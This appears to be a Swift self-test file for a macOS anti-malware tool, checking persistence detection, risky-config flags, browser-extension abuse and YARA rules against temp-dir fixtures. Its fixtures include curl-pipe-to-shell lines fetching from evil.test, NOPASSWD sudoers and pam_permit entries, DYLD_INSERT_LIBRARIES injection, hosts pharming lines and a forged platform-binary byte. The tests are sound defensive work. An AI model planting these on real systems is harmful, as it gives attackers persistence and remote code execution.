import Foundation
import RampartShared
import RampartEngine
import RampartSigning
import RampartYara
import RampartBehaviour

// WMS agent o10: persistence / posture / scan-coverage regressions. Every fixture lives in a private temp dir
// with harmless markers (EICAR, dummy strings). Nothing touches the real system configuration.
extension SelfTest {
    static func wmsO10Checks() {
        o10OwnDataAbuse()
        o10PlatformBinarySpoof()
        o10ConfigParsers()
        o10DiffAndAssess()
        o10BrowserAndInjection()
        o10LaunchItems()
        o10QuickScanRoots()
        o10YaraRules()
        o10RealMachineQuiet()
    }

    private static func o10Tmp(_ name: String) -> String {
        let p = SelfTest.fixtureTempDir + "rampart.test.o10-\(name)-\(getpid())"
        try? FileManager.default.createDirectory(atPath: p, withIntermediateDirectories: true)
        return p
    }

    private static var o10EICAR: Data { Data((["X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"]).joined().utf8) }

    // MARK: 1. hiding in RamPart-excluded paths

    static func o10OwnDataAbuse() {
        let fm = FileManager.default
        let home = NSHomeDirectory()
        // Look-alike data folders outside a home are NOT own data (they used to be, anywhere in the path).
        check(!OwnData.contains("/private/tmp/x/Library/Application Support/Rampart/payload"), "o10: /tmp look-alike Rampart data folder is scanned")
        check(!OwnData.contains("/Volumes/USB/Library/Application Support/Rampart/payload"), "o10: USB-stick look-alike Rampart data folder is scanned")
        check(!OwnData.contains(home + "/Downloads/a/Library/Application Support/Rampart/payload"), "o10: Downloads look-alike Rampart data folder is scanned")
        check(!OwnData.contains("/Users/someone/Library/Application Support/Rampart/../../../../../private/tmp/payload"), "o10: dot-dot escape from the data folder is scanned")
        check(!OwnData.contains(home + "/Library/Application Support/Rampart\u{200B}/payload"), "o10: zero-width look-alike folder is scanned")
        check(!OwnData.contains(home + "/Library/Application Support/Rampart /payload"), "o10: trailing-space look-alike folder is scanned")
        check(OwnData.contains("/Users/someone/LIBRARY/application support/RAMPART/q.rqf"), "o10: case variant of a real home data folder stays own data (APFS)")
        let w = WalkOptions()
        check(!w.isExcluded("/private/tmp/x/Library/Application Support/Rampart"), "o10: walker no longer skips /tmp look-alike data folder")
        check(!w.isExcluded("/Volumes/USB/Library/Application Support/Rampart/x"), "o10: walker no longer skips USB look-alike data folder")
        check(w.isExcluded("/Users/someone/Library/Application Support/Rampart/Quarantine/items/x.rqf"), "o10: real data folder still skipped")

        // Unregistered home-shaped folder in temp: EICAR is found (stricter replacement for the FP2 fixture).
        let base = o10Tmp("owndata")
        defer { try? fm.removeItem(atPath: base) }
        let fake = base + "/home/Library/Application Support/Rampart/Quarantine"
        try? fm.createDirectory(atPath: fake, withIntermediateDirectories: true)
        fm.createFile(atPath: fake + "/hidden.bin", contents: o10EICAR)
        let coord = ScanCoordinator(database: nil)
        coord.register(EICARDetector())
        check(coord.scanFile(at: fake + "/hidden.bin").detection?.name == EICAR.detectionName, "o10: EICAR in a home-shaped temp folder is detected")

        // A registered (real) data root: plain files stay exempt, runnable files planted there are scanned.
        let root = base + "/realroot/Rampart"
        try? fm.createDirectory(atPath: root + "/staging/x", withIntermediateDirectories: true)
        OwnData.register(root: root)
        defer { OwnData.unregister(root: root) }
        fm.createFile(atPath: root + "/item.quarantine", contents: o10EICAR)
        fm.createFile(atPath: root + "/planted", contents: o10EICAR, attributes: [.posixPermissions: 0o755])
        fm.createFile(atPath: root + "/staging/x/mid-quarantine", contents: o10EICAR, attributes: [.posixPermissions: 0o755])
        check(OwnData.contains(root + "/item.quarantine"), "o10: vault-style file in data root is own data")
        check(!OwnData.contains(root + "/planted"), "o10: executable planted in data root is NOT own data")
        check(OwnData.contains(root + "/staging/x/mid-quarantine"), "o10: vault staging stays exempt")
        check(coord.scanFile(at: root + "/item.quarantine").skippedReason == "RamPart data folder", "o10: vault-style file not scanned")
        check(coord.scanFile(at: root + "/planted").detection?.name == EICAR.detectionName, "o10: executable planted in data root is detected")
        // Walk of the parent: the data root is skipped as a folder, but the sweep still visits the planted program.
        let walked = coord.scan(paths: [base + "/realroot"])
        let hits = Set(walked.detections.compactMap { $0.path.map(PathUtil_o10.basename) })
        check(hits == ["planted"], "o10: walk finds the planted program only (\(hits.sorted()))")
        var shebang = Data("#!/bin/sh\n".utf8); shebang.append(Data(" echo o10\n".utf8))
        fm.createFile(atPath: root + "/script.txt", contents: shebang)
        check(OwnData.looksRunnable(root + "/script.txt") && !OwnData.contains(root + "/script.txt"), "o10: #! script in data root is not own data")
    }

    // MARK: 2. ad-hoc code claiming to be an Apple platform binary

    static func o10PlatformBinarySpoof() {
        check(SigningInspector.isSealedSystemLocation("/usr/bin/true"), "o10: /usr/bin is sealed")
        check(!SigningInspector.isSealedSystemLocation("/usr/local/bin/x"), "o10: /usr/local is not sealed")
        check(!SigningInspector.isSealedSystemLocation("/System/Volumes/Data/private/tmp/x"), "o10: the data-volume firmlink tree is not sealed")
        check(!SigningInspector.isSealedSystemLocation("/private/tmp/x"), "o10: /tmp is not sealed")
        let fm = FileManager.default
        let dir = o10Tmp("platform")
        defer { try? fm.removeItem(atPath: dir) }
        let exe = URL(fileURLWithPath: CommandLine.arguments[0]).resolvingSymlinksInPath().path
        let copy = dir + "/spoof"
        guard var d = fm.contents(atPath: exe) else { check(false, "o10: read own binary"); return }
        // Last CodeDirectory (magic 0xfade0c02, big-endian); the platform byte is at offset 38.
        let magic: [UInt8] = [0xfa, 0xde, 0x0c, 0x02]
        var at: Int?
        d.withUnsafeBytes { (b: UnsafeRawBufferPointer) in
            var i = b.count - 64
            while i > 0 { if b[i] == magic[0] && b[i + 1] == magic[1] && b[i + 2] == magic[2] && b[i + 3] == magic[3] { at = i; break }; i -= 1 }
        }
        guard let cd = at else { print("   NOTE: no CodeDirectory in the selftest binary; spoof PoC skipped"); return }
        d[cd + 38] = 0x0e
        fm.createFile(atPath: copy, contents: d, attributes: [.posixPermissions: 0o700])
        let r = SigningInspector.inspect(path: copy)
        print("   o10 spoof: status \(r.info.status.rawValue), platform \(r.isPlatformBinary)")
        check(r.info.status != .apple && !r.isPlatformBinary, "o10: ad-hoc binary with a forged platform byte is not treated as Apple")
    }

    // MARK: 3. P03 config hashing + known-bad lines

    static func o10ConfigParsers() {
        typealias S = PersistenceScanner
        let stockSudoers = "Defaults env_reset\nDefaults env_keep += \"BLOCKSIZE\"\nroot ALL = (ALL) ALL\n%admin  ALL = (ALL) ALL\n#includedir /private/etc/sudoers.d\n"
        check(S.riskyConfigLines(area: "sudoers", path: "/etc/sudoers", text: stockSudoers).isEmpty, "o10: stock sudoers is quiet")
        check(!S.riskyConfigLines(area: "sudoers", path: "/etc/sudoers.d/x", text: "mallory ALL=(ALL) NOPASSWD: ALL\n").isEmpty, "o10: NOPASSWD ALL flagged")
        check(!S.riskyConfigLines(area: "sudoers", path: "/etc/sudoers.d/x", text: "Defaults !authenticate\n").isEmpty, "o10: !authenticate flagged")
        check(!S.riskyConfigLines(area: "sudoers", path: "/etc/sudoers", text: "#includedir /private/tmp/r\n").isEmpty, "o10: include from /tmp flagged")
        check(!S.riskyConfigLines(area: "sudoers", path: "/etc/sudoers", text: "Defaults env_keep += \"DYLD_INSERT_LIBRARIES\"\n").isEmpty, "o10: env_keep DYLD flagged")
        let stockPam = "auth       sufficient     pam_smartcard.so\nauth       required       pam_opendirectory.so\naccount    required       pam_permit.so\npassword   required       pam_deny.so\nsession    required       pam_permit.so\n"
        check(S.riskyConfigLines(area: "pam", path: "/etc/pam.d/sudo", text: stockPam).isEmpty, "o10: stock pam.d/sudo is quiet")
        check(S.riskyConfigLines(area: "pam", path: "/etc/pam.d/sudo_local", text: "auth sufficient pam_tid.so\nauth optional /opt/homebrew/lib/pam/pam_reattach.so\n").isEmpty, "o10: Touch ID sudo is quiet")
        check(!S.riskyConfigLines(area: "pam", path: "/etc/pam.d/sudo", text: "auth sufficient pam_permit.so\n").isEmpty, "o10: auth pam_permit flagged")
        check(!S.riskyConfigLines(area: "pam", path: "/etc/pam.d/login", text: "auth optional /private/tmp/o10.so\n").isEmpty, "o10: foreign PAM module flagged")
        check(!S.riskyConfigLines(area: "pam", path: "/etc/pam.d/login", text: "auth optional pam_exec.so /tmp/x\n").isEmpty, "o10: pam_exec flagged")
        let stockHosts = "##\n# Host Database\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost\n0.0.0.0 ads.example.net\n0.0.0.0 www.google-analytics.com\n127.0.0.1 paypal.com\n"
        check(S.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: stockHosts).isEmpty, "o10: stock + ad-block hosts is quiet")
        check(!S.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: "127.0.0.1 swscan.apple.com\n").isEmpty, "o10: blocking Apple updates flagged")
        check(!S.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: "203.0.113.5 www.paypal.com\n").isEmpty, "o10: pharming redirect flagged")
        check(S.riskyConfigLines(area: "resolver", path: "/etc/resolver/test", text: "nameserver 127.0.0.1\n").isEmpty, "o10: dev resolver is quiet")
        check(S.riskyConfigLines(area: "resolver", path: "/etc/resolver/tail1234.ts.net", text: "nameserver 100.100.100.100\n").isEmpty, "o10: Tailscale resolver is quiet")
        check(!S.riskyConfigLines(area: "resolver", path: "/etc/resolver/apple.com", text: "nameserver 203.0.113.9\n").isEmpty, "o10: apple.com resolver hijack flagged")
        check(!S.riskyConfigLines(area: "resolver", path: "/etc/resolver/com", text: "nameserver 203.0.113.9\n").isEmpty, "o10: whole-TLD resolver hijack flagged")
        check(!S.riskyConfigLines(area: "sshd", path: "/etc/ssh/sshd_config", text: "AuthorizedKeysCommand /private/tmp/k\n").isEmpty, "o10: AuthorizedKeysCommand flagged")
        check(S.riskyConfigLines(area: "sshd", path: "/etc/ssh/sshd_config", text: "AuthorizedKeysCommand none\nPermitRootLogin no\n#PermitRootLogin yes\n").isEmpty, "o10: stock sshd quiet")
        check(!S.riskyConfigLines(area: "sshrc", path: "/Users/x/.ssh/rc", text: "/private/tmp/o10 &\n").isEmpty, "o10: ~/.ssh/rc command flagged")
    }

    // MARK: 4. baseline gating, diffs and assessment

    static func o10DiffAndAssess() {
        func rec(_ hosts: String) -> PersistenceRecord {
            let risky = PersistenceScanner.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: hosts)
            var a = ["class": "sysconfig", "area": "hosts", "collector": "sysconfig"]
            if !risky.isEmpty { a["riskyLines"] = risky.joined(separator: "\n") }
            return PersistenceRecord(item: PersistenceItem(kind: .other, label: "hosts: hosts", location: "/etc/hosts"), attributes: a,
                                     fingerprint: String(hosts.hashValue))
        }
        // An old baseline (no collectors list) never sees the new collector's records as "added".
        var oldBase = PersistenceSnapshot(records: []); oldBase.collectors = nil
        let cur = PersistenceSnapshot(records: [rec("203.0.113.5 www.paypal.com\n")])
        check(PersistenceDiffer.diff(baseline: oldBase, current: cur).added.isEmpty, "o10: new collector seeds the baseline silently")
        let newBase = PersistenceSnapshot(records: [])
        check(PersistenceDiffer.diff(baseline: newBase, current: cur).added.count == 1, "o10: once baselined, a new file is reported")
        // A decoded pre-o10 snapshot has no collectors.
        if let data = try? JSONEncoder().encode(oldBase), let back = try? JSONDecoder().decode(PersistenceSnapshot.self, from: data) {
            check(back.collectors == nil, "o10: old snapshots decode with no collectors")
        }

        let engine = BehaviourEngine()
        let before = rec("127.0.0.1 localhost\n"), edited = rec("127.0.0.1 localhost\n10.0.0.2 nas.lan\n")
        check(engine.evaluatePersistence(added: [], changed: [PersistenceChange(old: before, new: edited)]).isEmpty, "o10: benign hosts edit is quiet")
        let hijack = rec("127.0.0.1 localhost\n203.0.113.5 www.paypal.com\n")
        let d = engine.evaluatePersistence(added: [], changed: [PersistenceChange(old: before, new: hijack)])
        check(d.contains { $0.evidence.contains { $0.title.contains("RP1") || $0.detail.contains("paypal") } }, "o10: hosts pharming change detected (\(d.map(\.name)))")
        let again = rec("127.0.0.1 localhost\n203.0.113.5 www.paypal.com\n# note\n")
        check(BehaviourEngine().evaluatePersistence(added: [], changed: [PersistenceChange(old: hijack, new: again)]).isEmpty, "o10: an already-known risky line is not re-alerted")

        let assessor = PersistenceAssessor(trust: { $0.contains("signed") ? .notarized : .unsigned })
        func other(_ cls: String, _ extra: [String: String] = [:], target: String? = nil, env: [String: String] = [:]) -> PersistenceRecord {
            var a = extra; a["class"] = cls
            return PersistenceRecord(item: PersistenceItem(kind: .other, label: cls, location: "/fixture/" + cls, target: target), environment: env, attributes: a)
        }
        check(assessor.assess(other("plugin", ["pluginType": "Quick Look generator"], target: "/Library/QuickLook/o10.qlgenerator")).first?.ruleID == "RP3", "o10: unsigned QuickLook generator -> RP3")
        check(assessor.assess(other("plugin", ["pluginType": "Spotlight importer"], target: "/Library/Spotlight/signed.mdimporter")).isEmpty, "o10: notarized plug-in quiet")
        check(assessor.assess(other("kext", target: "/Library/Extensions/o10.kext")).first?.ruleID == "RP3", "o10: unsigned kext -> RP3")
        check(assessor.assess(other("folderActions", ["enabled": "1"])).first?.ruleID == "RP4", "o10: Folder Actions enabled -> RP4")
        check(assessor.assess(other("folderActions", ["enabled": "0"])).isEmpty, "o10: Folder Actions off quiet")
        check(assessor.assess(other("emond", target: "/etc/emond.d/rules/x.plist")).first?.ruleID == "R11", "o10: emond rule -> R11")
        // SecurityAgent plug-in hidden with a dot name is now enumerated and assessed (R17).
        check(assessor.assess(other("SecurityAgentPlugins", ["hidden": "1", "collector": "hiddenItems"], target: "/Library/Security/SecurityAgentPlugins/.o10.bundle")).first?.ruleID == "R17", "o10: hidden auth plug-in -> R17")
        for id in ["RP1", "RP2", "RP3", "RP4", "RP5", "RP6"] { check(RuleSet.default.rules.contains { $0.id == id }, "o10: rule \(id) present") }
        check(RuleSet.default.validate().isEmpty, "o10: rule set still validates")
    }

    // MARK: 5. browsers (P02) and DYLD via LaunchServices

    static func o10BrowserAndInjection() {
        let fm = FileManager.default
        let base = o10Tmp("browser")
        defer { try? fm.removeItem(atPath: base) }
        let assessor = PersistenceAssessor(trust: { _ in .unknown })
        // Unpacked extension in Secure Preferences, dropped in a hidden Application Support folder (Adload-style).
        let profile = base + "/Default", extDir = base + "/.hid/ext"
        try? fm.createDirectory(atPath: profile, withIntermediateDirectories: true)
        try? fm.createDirectory(atPath: extDir, withIntermediateDirectories: true)
        fm.createFile(atPath: extDir + "/manifest.json", contents: Data(#"{"name":"o10 test","permissions":["<all_urls>","cookies"]}"#.utf8))
        let prefs: [String: Any] = ["extensions": ["settings": ["abcdefghijklmnopabcdefghijklmnop": ["location": 4, "path": extDir]]]]
        fm.createFile(atPath: profile + "/Secure Preferences", contents: try? JSONSerialization.data(withJSONObject: prefs))
        let unpacked = PersistenceScanner.chromiumUnpacked(profileDir: profile, browser: "Chrome", home: "/Users/nobody")
        check(unpacked.count == 1 && unpacked[0].attributes["collector"] == "chromiumExtra", "o10: unpacked extension enumerated (\(unpacked.count))")
        check(unpacked.first.map { assessor.assess($0).contains { $0.ruleID == "R20" } } == true, "o10: hidden unpacked extension -> R20")
        check(PersistenceScanner.isDeveloperUnpacked("/Users/someone/code/myext", home: "/Users/someone"), "o10: project-folder unpacked extension is a developer's")
        check(!PersistenceScanner.isDeveloperUnpacked("/Users/someone/Library/Application Support/x/ext", home: "/Users/someone"), "o10: Library unpacked extension is not a developer's")
        var dev = unpacked.first!; dev.attributes["devUnpacked"] = "1"
        check(!assessor.assess(dev).contains { $0.ruleID == "R20" }, "o10: developer unpacked extension does not raise R20")
        // External Extensions JSON.
        let ext = base + "/External Extensions"
        try? fm.createDirectory(atPath: ext, withIntermediateDirectories: true)
        fm.createFile(atPath: ext + "/aaaabbbbccccddddaaaabbbbccccdddd.json", contents: Data(#"{"external_crx":"/private/tmp/o10.crx","external_version":"1.0"}"#.utf8))
        fm.createFile(atPath: ext + "/bbbbccccddddaaaabbbbccccddddaaaa.json", contents: Data(#"{"external_update_url":"https://clients2.google.com/service/update2/crx"}"#.utf8))
        let ee = PersistenceScanner.externalExtensions(dir: ext, browser: "Chrome")
        check(ee.count == 2, "o10: External Extensions enumerated")
        check(ee.filter { assessor.assess($0).contains { $0.ruleID == "R20" } }.map { $0.attributes["extensionID"] ?? "" } == ["aaaabbbbccccddddaaaabbbbccccdddd"], "o10: only the local-crx external extension -> R20")
        let forced = PersistenceScanner.forceInstallRecords(policy: ["ExtensionInstallForcelist": ["ccccddddaaaabbbbccccddddaaaabbbb;https://evil.test/u.xml"]], plist: "/Library/Preferences/com.google.Chrome.plist", browser: "Chrome")
        check(forced.count == 1 && assessor.assess(forced[0]).contains { $0.ruleID == "R20" }, "o10: policy force-install -> R20")
        let safari = PersistenceScanner.safariRecords(plist: ["com.example.ext.Extension (ABCDE12345)": ["Enabled": true]], path: "/x/Extensions.plist", kind: "app extension")
        check(safari.count == 1 && safari[0].attributes["teamID"] == "ABCDE12345" && assessor.assess(safari[0]).isEmpty, "o10: Safari extension inventoried, not alerted")
        // LSEnvironment DYLD_* injection.
        let ls = PersistenceScanner.lsEnvironmentRecord(env: ["DYLD_INSERT_LIBRARIES": "/private/tmp/o10.dylib", "LANG": "en"], location: "/Applications/X.app/Contents/Info.plist", label: "X.app")
        check(ls.map { assessor.assess($0).first?.ruleID == "RP5" } == true, "o10: LSEnvironment DYLD -> RP5")
        check(PersistenceScanner.lsEnvironmentRecord(env: ["LANG": "en"], location: "/x", label: "y") == nil, "o10: normal LSEnvironment ignored")
        // Re-opened apps: only temp/hidden/shared become records.
        let tal = PersistenceScanner.relaunchRecords(apps: [["Path": "/private/tmp/o10/Evil.app", "BundleID": "x"], ["Path": "/Applications/Safari.app"],
                                                            ["Path": "/Users/someone/Downloads/Tool.app"]], plist: "/x.plist")
        check(tal.count == 1 && assessor.assess(tal[0]).first?.ruleID == "RP6", "o10: re-opened app from /tmp -> RP6, Downloads/Applications quiet")
    }

    // MARK: 6. launch items: hidden plists, own-label tricks, data-folder targets

    static func o10LaunchItems() {
        let fm = FileManager.default
        let base = o10Tmp("launch")
        defer { try? fm.removeItem(atPath: base) }
        let la = base + "/LaunchAgents"
        try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
        let pl: [String: Any] = ["Label": "com.o10.hidden", "ProgramArguments": ["/usr/bin/true"], "RunAtLoad": true]
        fm.createFile(atPath: la + "/.com.o10.hidden.plist", contents: try? PropertyListSerialization.data(fromPropertyList: pl, format: .xml, options: 0))
        var c = PersistenceScanConfig(home: base, kinds: [.launchAgent], runCommands: false, resolveSigning: false)
        c.launchAgentDirs = [la]; c.launchDaemonDirs = []
        let recs = PersistenceScanner(config: c).scanRecords()
        check(recs.first?.attributes["hidden"] == "1", "o10: dot-named launch plist marked hidden")
        let assessor = PersistenceAssessor(trust: { $0.hasPrefix("/usr/") ? .apple : .unsigned })
        check(recs.first.map { assessor.assess($0).contains { $0.ruleID == "RP6" } } == true, "o10: hidden launch plist -> RP6")

        let dotdot = PersistenceRecord(item: PersistenceItem(kind: .launchAgent, label: "app.rampart.updater", location: la + "/app.rampart.updater.plist",
                                                             target: "/Applications/Rampart.app/Contents/../../../private/tmp/o10"),
                                       arguments: ["/Applications/Rampart.app/Contents/../../../private/tmp/o10"])
        check(!PersistenceAssessor.isRampartOwn(dotdot), "o10: app.rampart.* label with a ../ target is not ours")
        check(!assessor.assess(dotdot).isEmpty, "o10: ../ trick job is assessed (\(assessor.assess(dotdot).map(\.ruleID)))")

        let ownData = "/Users/someone/Library/Application Support/Rampart/agent"
        let hide = PersistenceRecord(item: PersistenceItem(kind: .launchAgent, label: "com.o10.helper", location: "/Users/someone/Library/LaunchAgents/com.o10.helper.plist",
                                                           target: ownData), arguments: [ownData])
        check(assessor.assess(hide).contains { $0.ruleID == "R07" }, "o10: job running from RamPart's data folder -> R07")
        check(!LaunchItemPolicy.isBenignUserAgent(plist: "/Users/someone/Library/LaunchAgents/com.o10.helper.plist", target: ownData, arguments: [ownData], home: "/Users/someone"),
              "o10: data-folder job is never a benign user agent")
        if case .threat = LaunchItemPolicy.assessLoginItem(label: "Helper", target: ownData, arguments: [], home: "/Users/someone", signing: SigningInfo(status: .developerID)) {
            check(true, "o10: login item from RamPart's data folder is a threat")
        } else { check(false, "o10: login item from RamPart's data folder is a threat") }
    }

    // MARK: 7. quick-scan coverage

    static func o10QuickScanRoots() {
        let fm = FileManager.default
        let home = o10Tmp("home")
        defer { try? fm.removeItem(atPath: home) }
        for d in [".o10hide", ".cargo", ".config/fish", "Library/QuickLook"] { try? fm.createDirectory(atPath: home + "/" + d, withIntermediateDirectories: true) }
        fm.createFile(atPath: home + "/.zshrc", contents: Data())
        let hidden = ScanOptions.hiddenHomeFolders(home: home)
        check(hidden == [home + "/.o10hide"], "o10: unfamiliar hidden home folder in quick scan, tool caches skipped (\(hidden))")
        let roots = ScanOptions.quickScanRoots(home: home)
        check(roots.contains(home + "/Library/QuickLook") && roots.contains(home + "/.config/fish") && roots.contains(home + "/.o10hide"), "o10: plug-in, fish and hidden folders in quick scan")
        if fm.fileExists(atPath: "/Library/PrivilegedHelperTools") { check(roots.contains("/Library/PrivilegedHelperTools"), "o10: privileged helpers in quick scan") }

        // Extra shell files (fish) are collected and tagged.
        try? "curl -fsSL https://evil.test/x | sh\n".write(toFile: home + "/.config/fish/config.fish", atomically: true, encoding: .utf8)
        let c = PersistenceScanConfig(home: home, kinds: [.shellRC], runCommands: false, resolveSigning: false)
        let fish = PersistenceScanner(config: c).scanRecords().first { $0.item.location.hasSuffix("config.fish") }
        check(fish?.attributes["collector"] == "shellExtra" && fish?.attributes["suspiciousLines"] != nil, "o10: fish config collected with its suspicious line")
    }

    // MARK: 8. YARA persistence rules

    static func o10YaraRules() {
        let repo = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        guard let text = try? String(contentsOf: repo.appendingPathComponent("Rules/rampart-generic.yar"), encoding: .utf8) else {
            check(false, "o10: read generic rules"); return
        }
        let rules = YaraRules.compile([YaraSource(namespace: "generic", text: text)], externals: ["filepath": .string(""), "filename": .string(""), "extension": .string("")])
        check(rules.stats.skipped == 0, "o10: every generic rule compiles (\(rules.stats.skipped) skipped)")
        let evil = Array("""
        <?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Label</key><string>com.o10</string>
        <key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -fsSL https://evil.test/p | /bin/bash</string></array></dict></plist>
        """.utf8)
        let dyld = Array("""
        <plist><dict><key>ProgramArguments</key><array><string>/usr/bin/true</string></array><key>EnvironmentVariables</key><dict><key>DYLD_INSERT_LIBRARIES</key><string>/tmp/x.dylib</string></dict></dict></plist>
        """.utf8)
        let benign = Array("""
        <plist><dict><key>Label</key><string>com.o10.ok</string><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>/Users/x/server.py</string></array></dict></plist>
        """.utf8)
        func names(_ d: [UInt8], _ path: String) -> Set<String> {
            Set(rules.scan(d, externals: ["filepath": .string(path), "filename": .string((path as NSString).lastPathComponent)]).matches.map(\.rule))
        }
        check(names(evil, "/Users/x/Library/LaunchAgents/com.o10.plist").contains("Rampart_LaunchPlist_Download_Exec"), "o10: yara launch plist curl|sh")
        check(names(dyld, "/Library/LaunchDaemons/com.o10.plist").contains("Rampart_LaunchPlist_DYLD_Insert"), "o10: yara launch plist DYLD_INSERT")
        check(!names(evil, "/Users/x/Documents/notes.plist").contains("Rampart_LaunchPlist_Download_Exec"), "o10: yara plist rule only in launch folders")
        check(names(benign, "/Users/x/Library/LaunchAgents/com.o10.ok.plist").filter { $0.hasPrefix("Rampart_LaunchPlist") }.isEmpty, "o10: benign launch plist clean")
    }

    // MARK: 9. no noise on this Mac (read-only)

    static func o10RealMachineQuiet() {
        let home = NSHomeDirectory()
        let signing: SigningProvider = { SigningInspector.inspectCached(path: $0).info }
        let engine = BehaviourEngine(signing: signing)
        // As if every o10 record on this Mac were new (worst case): config, plug-ins, kexts, re-opened apps, LSEnvironment.
        var c = PersistenceScanConfig(home: home, kinds: [.other, .shellRC], runCommands: false, resolveSigning: false)
        c.launchAgentDirs = []; c.launchDaemonDirs = []
        let recs = PersistenceScanner(config: c).scanRecords().filter { $0.attributes["collector"] != nil }
        // Realistic path: first run seeds the baseline, an unchanged rescan reports nothing.
        let base = PersistenceSnapshot(records: recs)
        check(PersistenceDiffer.diff(baseline: base, current: PersistenceSnapshot(records: recs)).isEmpty, "o10: unchanged rescan of this Mac is empty")
        let found = engine.evaluatePersistence(added: recs)
        // A passwordless-sudo grant (e.g. for an agent) IS what R16 should flag when it is new; anything else must be quiet.
        let loud = found.filter { $0.confidence >= 60 && !($0.path ?? "").hasPrefix("/etc/sudoers") }
        print("   o10 real machine: \(recs.count) tagged records, \(found.count) finding(s), \(loud.count) loud: \(loud.prefix(5).map { "\($0.name) \($0.path ?? "")" })")
        check(loud.isEmpty, "o10: no loud persistence finding on this Mac's own setup (worst case: all new)")
        check(PersistenceScanner.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: "0.0.0.0 telemetry.malwarebytes.com\n:: telemetry.malwarebytes.com\n").isEmpty,
              "o10: ad-block entry for a vendor's telemetry is quiet")
        check(!PersistenceScanner.riskyConfigLines(area: "hosts", path: "/etc/hosts", text: "0.0.0.0 www.malwarebytes.com\n").isEmpty, "o10: blocking a security vendor's site flagged")
    }
}

private enum PathUtil_o10 { static func basename(_ p: String) -> String { (p as NSString).lastPathComponent } }
